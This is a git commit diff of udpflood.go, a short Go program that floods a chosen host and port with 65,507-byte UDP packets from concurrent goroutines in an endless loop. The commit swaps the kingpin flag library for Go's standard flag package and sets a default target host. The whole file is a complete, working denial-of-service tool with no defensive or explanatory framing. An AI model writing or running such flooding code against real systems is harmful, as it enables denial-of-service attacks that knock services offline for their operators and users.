47c595c249e27329378bbd67d08485038bd7550d
Cameron Poe <cameron@zay.li>
2016-11-03 17:18:31 -0500

    Replaced kingpin with standard flag library

--- udpflood.go
+++ udpflood.go
@@ -1,39 +1,40 @@
 package main
 
 import (
-    "gopkg.in/alecthomas/kingpin.v2"
-    "net"
-    "fmt"
+	"flag"
+	"fmt"
+	"net"
 )
 
 var (
-        _host     = kingpin.Flag("host", "Hostname").Short('h').Required().String()
-        _port     = kingpin.Flag("port", "Port number").Short('p').Required().Int()
-        _threads     = kingpin.Flag("threads", "Thread count").Short('t').Default("1").Int()
-        _size     = kingpin.Flag("size", "Packet Size").Short('s').Default("65507").Int()
-    )
+	_host    = flag.String("h", "cameron.li", "Specify Host")
+	_port    = flag.Int("p", 443, "Specify Port")
+	_threads = flag.Int("t", 1, "Specify threads")
+	_size    = flag.Int("s", 65507, "Packet Size")
+)
 
-func main () {
-    kingpin.Parse()
+func main() {
+	flag.Parse()
 
-    fullAddr := fmt.Sprintf("%s:%v", *_host, *_port)
-    //Create send buffer
-    var buf []byte = make([]byte, *_size)
+	fullAddr := fmt.Sprintf("%s:%v", *_host, *_port)
+	//Create send buffer
+	var buf []byte = make([]byte, *_size)
 
-    //Establish udp
-    conn, err := net.Dial("udp", fullAddr); if err != nil {
-        fmt.Println(err)
-    } else {
-        fmt.Printf("Flooding %s\n", fullAddr)
-        for i := 0; i < *_threads; i++ {
-            go func(){
-                for {
-                    conn.Write(buf)
-                }
-            }()
-        }
-    }
+	//Establish udp
+	conn, err := net.Dial("udp", fullAddr)
+	if err != nil {
+		fmt.Println(err)
+	} else {
+		fmt.Printf("Flooding %s\n", fullAddr)
+		for i := 0; i < *_threads; i++ {
+			go func() {
+				for {
+					conn.Write(buf)
+				}
+			}()
+		}
+	}
 
-    //Sleep forever
-    <-make(chan bool, 1)
+	//Sleep forever
+	<-make(chan bool, 1)
 }
